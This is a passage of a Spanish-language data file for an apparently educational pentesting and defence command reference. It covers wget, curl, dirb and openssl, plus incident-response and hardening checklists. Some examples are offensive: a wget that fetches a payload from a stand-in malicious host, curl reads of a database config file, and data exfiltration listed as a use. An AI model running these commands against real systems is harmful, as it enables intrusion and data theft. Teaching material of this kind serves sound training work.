                "command": "whoami",
                "description": "Verifica tu usuario actual"
              }
            ],
            "useCases": [
              "Verificar usuario después de SSH",
              "Confirmar privilegios antes de comandos sudo",
              "Scripts que necesitan saber el usuario actual"
            ]
          },
          {
            "name": "wget",
            "fullName": "Web Get",
            "description": "Descarga archivos desde la web.",
            "syntax": "wget [opciones] [URL]",
            "category": "admin",
            "team": "red",
            "examples": [
              {
                "command": "wget http://malicious-server.com/payload.sh",
                "description": "Descarga un payload (simulado)"
              },
              {
                "command": "wget -O /tmp/exploit.py https://example.com/exploit.py",
                "description": "Descarga con nombre personalizado"
              }
            ],
            "commonFlags": [
              { "flag": "-O", "description": "Nombre de archivo de salida" },
              { "flag": "-q", "description": "Modo silencioso" },
              { "flag": "-c", "description": "Continúa descarga interrumpida" },
              { "flag": "--no-check-certificate", "description": "Ignora errores de certificado SSL" }
            ],
            "securityNote": "🚨 En pentesting, wget se usa para descargar payloads y herramientas. En defensa, monitorear descargas sospechosas."
          }
        ]
      },
      {
        "id": "web-testing",
        "name": "Pruebas de Aplicaciones Web",
        "icon": "globe",
        "color": "bg-orange-600",
        "description": "Herramientas para auditoría y pentesting de aplicaciones web",
        "commands": [
          {
            "name": "curl",
            "fullName": "Client URL",
            "description": "Herramienta de línea de comandos para transferir datos con URLs. Útil para pruebas de APIs y web.",
            "syntax": "curl [opciones] [URL]",
            "category": "web",
            "team": "both",
            "examples": [
              {
                "command": "curl http://10.0.10.5",
                "description": "GET básico de una página"
              },
              {
                "command": "curl http://10.0.10.5/db_config.php",
                "description": "Intenta leer archivo sensible"
              },
              {
                "command": "curl -X POST -d 'user=admin&pass=123' http://10.0.10.5/login.php",
                "description": "POST para formulario de login"
              },
              {
                "command": "curl -H 'User-Agent: Mozilla/5.0' http://10.0.10.5",
                "description": "GET con header personalizado"
              },
              {
                "command": "curl -I http://10.0.10.5",
                "description": "Solo headers (HEAD request)"
              }
            ],
            "commonFlags": [
              { "flag": "-X", "description": "Método HTTP (GET, POST, PUT, DELETE)" },
              { "flag": "-d", "description": "Datos POST" },
              { "flag": "-H", "description": "Header personalizado" },
              { "flag": "-I", "description": "Solo muestra headers" },
              { "flag": "-i", "description": "Incluye headers en la salida" },
              { "flag": "-k", "description": "Ignora errores de certificado SSL" },
              { "flag": "-L", "description": "Sigue redirects" },
              { "flag": "-o", "description": "Guarda salida en archivo" }
            ],
            "useCases": [
              "Probar APIs REST",
              "Fuzzing de parámetros web",
              "Exfiltración de datos",
              "Verificar headers de seguridad",
              "Pruebas de inyección"
            ]
          },
          {
            "name": "dirb",
            "fullName": "Directory Buster",
            "description": "Escáner de directorios y archivos web mediante fuerza bruta con wordlists.",
            "syntax": "dirb [URL] [wordlist]",
            "category": "web",
            "team": "red",
            "examples": [
              {
                "command": "dirb http://10.0.10.5",
                "description": "Escaneo con wordlist por defecto"
              },
              {
                "command": "dirb http://10.0.10.5 /usr/share/wordlists/dirb/common.txt",
                "description": "Escaneo con wordlist específica"
              },
              {
                "command": "dirb http://10.0.10.5 -X .php,.txt",
                "description": "Busca solo archivos PHP y TXT"
              }
            ],
            "commonFlags": [
              { "flag": "-X", "description": "Extensiones a buscar" },
              { "flag": "-w", "description": "No detener en WARNING" },
              { "flag": "-r", "description": "No hacer búsqueda recursiva" }
            ],
            "useCases": [
              "Descubrir archivos de backup (.bak, .old)",
              "Encontrar paneles de administración",
              "Localizar archivos sensibles (db_config, phpinfo)",
              "Mapear estructura de directorios"
            ],
            "commonFinds": [
              "/admin/ - Panel de administración",
              "/backup/ - Backups del sitio",
              "/config/ - Archivos de configuración",
              "/.git/ - Repositorio Git expuesto",
              "/db_config.php - Credenciales de base de datos",
              "/phpinfo.php - Información del sistema"
            ]
          },
          {
            "name": "openssl",
            "fullName": "OpenSSL",
            "description": "Toolkit criptográfico. Útil para pruebas de SSL/TLS y certificados.",
            "syntax": "openssl [comando] [opciones]",
            "category": "web",
            "team": "both",
            "examples": [
              {
                "command": "openssl s_client -connect 10.0.10.5:443",
                "description": "Verifica certificado SSL y cifrados soportados"
              },
              {
                "command": "openssl s_client -connect 10.0.10.5:443 -showcerts",
                "description": "Muestra toda la cadena de certificados"
              },
              {
                "command": "openssl s_client -connect 10.0.10.5:443 -cipher 'DES-CBC3-SHA'",
                "description": "Prueba un cifrado específico (débil)"
              }
            ],
            "useCases": [
              "Auditar configuración SSL/TLS",
              "Detectar cifrados débiles",
              "Verificar vencimiento de certificados",
              "Probar vulnerabilidades como Heartbleed"
            ],
            "securityChecks": [
              "✅ Verificar que solo TLS 1.2+ esté habilitado",
              "✅ Deshabilitar cifrados débiles (DES, RC4, MD5)",
              "✅ Certificado válido y no expirado",
              "✅ Cadena de certificados completa",
              "✅ No hay vulnerabilidades conocidas (Heartbleed, POODLE)"
            ]
          }
        ]
      }
    ],
    "quickReference": {
      "emergencyCommands": {
        "title": "Comandos de Emergencia (Respuesta a Incidentes)",
        "commands": [
          {
            "scenario": "Ataque de Fuerza Bruta Detectado",
            "steps": [
              "1. journalctl -u sshd | grep 'Failed password' | tail -20",
              "2. sudo ufw deny from [IP_ATACANTE]",
              "3. fail2ban-client status sshd"
            ]
          },
          {
            "scenario": "Servidor Web Comprometido",
            "steps": [
              "1. sha256sum /var/www/html/*.php > /tmp/current_hashes.txt",
              "2. diff /root/baseline_hashes.txt /tmp/current_hashes.txt",
              "3. ps aux | grep www-data",
              "4. ss -tulnp | grep :80"
            ]
          },
          {
            "scenario": "Ataque DoS en Progreso",
            "steps": [
              "1. top (verificar carga CPU)",
              "2. ss -s (estadísticas de conexiones)",
              "3. sudo ufw enable",
              "4. sudo ufw limit ssh",
              "5. Contactar ISP/CloudFlare para mitigación upstream"
            ]
          }
        ]
      },
      "dailyMonitoring": {
        "title": "Comandos de Monitoreo Diario (SOC)",
        "commands": [
          "sudo ufw status numbered - Verificar reglas de firewall",
          "journalctl -p err --since today - Errores del día",
          "journalctl -u sshd --since today | grep 'Accepted' - Logins SSH exitosos",
          "ps aux --sort=-%mem | head - Top 10 procesos por memoria",
          "ss -tulnp - Puertos escuchando",
          "fail2ban-client status - Estado de fail2ban"
        ]
      },
      "hardeningChecklist": {
        "title": "Checklist de Hardening Post-Instalación",
        "items": [
          "✅ Actualizar sistema: apt update && apt upgrade",
          "✅ Configurar firewall: sudo ufw enable",
          "✅ Asegurar SSH: PermitRootLogin no, PasswordAuthentication no",
          "✅ Instalar fail2ban: apt install fail2ban",
          "✅ Permisos de archivos sensibles: chmod 640 /etc/shadow",
          "✅ Deshabilitar servicios innecesarios",
          "✅ Crear usuario no-root para administración",
          "✅ Configurar logs centralizados"
        ]
      }
    }
  }
};
